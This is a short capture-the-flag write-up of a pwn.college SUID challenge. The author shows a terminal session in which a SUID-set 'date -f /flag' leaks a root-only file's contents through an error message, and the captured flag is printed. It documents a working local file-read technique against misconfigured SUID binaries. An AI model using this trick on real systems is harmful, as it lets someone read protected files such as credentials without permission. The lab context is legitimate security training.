`date` command in Unix-like OS is used to display or set the system date and time.

```bash
hacker@program-misuse-level-45:~$ /challenge/babysuid_level45 
Welcome to /challenge/babysuid_level45!

This challenge is part of a series of programs that
just straight up weren't designed to let you read files.

I just set the SUID bit on /usr/bin/date.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level45) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/date!
hacker@program-misuse-level-45:~$ date /flag
date: invalid date '/flag'
hacker@program-misuse-level-45:~$ date -f /flag 3/2/2024
date: the argument '3/2/2024' lacks a leading '+';
when using an option to specify date(s), any non-option
argument must be a format string beginning with '+'
Try 'date --help' for more information.
hacker@program-misuse-level-45:~$ date -f /flag +3/2/2024
date: invalid date 'pwn.college{8nUBVzhWY_qcgUtL4fh_WodeW3x.01N4EDL0AjNzQzW}'
```

I just ran `date /flag` by intuition. It says `invalid date` . I read the `man date` and found that `-f` takes a `file` and then ran `date -f /flag 3/2/2024` giving an arbitrary date. Then it says it needs a `+` before the date. I wrote the command accordingly and it throws an error and gives the flag. 

> [!question]
> Don't know why it says `invalid date`.  Needs to check back later.

